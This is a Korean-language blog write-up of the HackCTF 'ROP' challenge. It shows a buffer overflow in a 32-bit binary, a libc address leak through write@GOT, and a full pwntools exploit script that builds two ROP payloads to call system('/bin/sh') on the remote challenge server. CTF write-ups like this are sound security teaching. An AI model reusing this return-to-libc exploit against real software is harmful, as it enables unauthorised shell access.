---
layout: post
title:  "HacCTF ROP write-up"
date:   2020-02-03 19:45:55
image:  hackctf_rop.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ROP/Untitled.png)

NX비트가 걸려있고 Partial RELRO가 걸려있다. GOT overwrite는 가능할 것으로 보인다
<br><br><br>
**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ROP/Untitled%201.png)

바이너리를 실행시키면 바로 입력을 받고, Hello, World!를 출력하고 종료된다.
<br><br><br>
**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ROP/Untitled%202.png)

메인은 별게 없다. vulnerable_Function 함수가 하나 존재하고, write로 표준 출력을 통해 문자열을 출력시켜준다.
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ROP/Untitled%203.png)

vulnerable_function 함수를 보면 read함수가 끝이다. 해당 함수를 이용하여 ret를 덮을수 있을 것이다.
<br><br><br><br>
### 2. 접근방법

---

딱 보면 어떻게 할지 보인다.

1) ret를 덮어 libc 주소를 알아낸다

2) 알아낸 주소를 통해 libc base를 알아내고, 이를 이용하여 system 함수를 호출한다.
<br><br>

그럼 지금 필요한 것이 무엇인지 정리를 해보자.
<br><br>
- 아무 함수의 libc 주소

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20ROP/Untitled%204.png)
    
    현재 read, write, __gmon_start, __libc_start_main 이 4개가 끝이다. 따라서 write 함수로 write got를 인자로 넣어 write의 실 주소를 구해야 한다<br><br>

- libc  base 주소

    문제에서 libc.so.6 파일을 제공해줬으므로 이를 이용하여 write함수의 offset을 pwntools 기능을 통해 바로 구할수 있다. 따라서 위에서 구한 주소에서 offset을 빼서 base 주소를 구해야 한다<br><br>

- /bin/sh 주소

    read를 호출하게 하여 .bss 영역에 직접 입력을 하는 방법, 혹은 offset을 통해 libc에 저장된 /bin/sh 주소를 구하는 방식, 등을 이용하여 해당 문자열의 주소를 구해야 한다<br><br>

- system 함수 주소

    위에서 base 주소를 구했으므로, offset을 이용해야 구해야 한다.<br><br>

추가적으로 디버깅을 할때 현 내 로컬 시스템의 llibc가 아닌, 주어진 libc를 링킹해서 디버깅을 진행하면 간편하다. 방법은 아래의 코드를 익스코드 위에 추가하면 된다.

    ...
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
    p = process("./rop", env=env, aslr=False)
    ...
<br><br><br><br>
### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level='DEBUG'
p=remote("ctf.j0n9hyun.xyz",3021)
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
#p = process("./rop", env=env, aslr=False)
e=ELF("./rop")
libc=ELF("./libc.so.6")
#gdb.attach(p,""" b* 0x0804847E  """)

write_plt=e.plt["write"]
write_got=e.got["write"]
read_plt=e.plt['read']

#log.info("libc_start_main offset::"+hex(e.symbols['__libc_start_main']))
log.info("write_plt::"+hex(write_plt))
log.info("write_got::"+hex(write_got))
#log.info("libc_base::"+hex(libc_base))

payload="A"*0x88+"B"*4
payload+=p32(write_plt)
payload+=p32(0x08048509)
payload+=p32(0x1)
payload+=p32(write_got)
payload+=p32(0x8)
payload+=p32(0x0804844b)
p.sendline(payload)
#log.info(p.recv)
#pause()
write_addr=p.recv(4)
#log.info(hex(write_addr))
#pause()
libc_base=u32(write_addr)-libc.symbols['write']

payload2="A"*0x8c
payload2+=p32(read_plt)
payload2+=p32(0x08048509)
payload2+=p32(0x0)
payload2+=p32(0x0804a024)
payload2+=p32(0x8)
payload2+=p32(libc_base+libc.symbols['system'])
payload2+="AAAA"
payload2+=p32(0x0804a024)

p.sendline(payload2)
p.sendline("/bin/sh\x00")
p.interactive()
```
<br><br><br>
### 4. 몰랐던 개념

---

처음에 read와 write는 syscall인데 libc 주소를 어케 구하지 라고 고민을 많이 했었다.

하지만 일반적으로 우리가 코딩할때 사용하는 read, write는 syscall이 아닌 libc에서 syscall read, write를 이용하여 wrapping한 read, write 였다.

따라서 이를 이용하여 똑같은 방식으로 libc leak을 진행하면 됬었다. 추후에 read, write 코드를 한번 봐야겠다.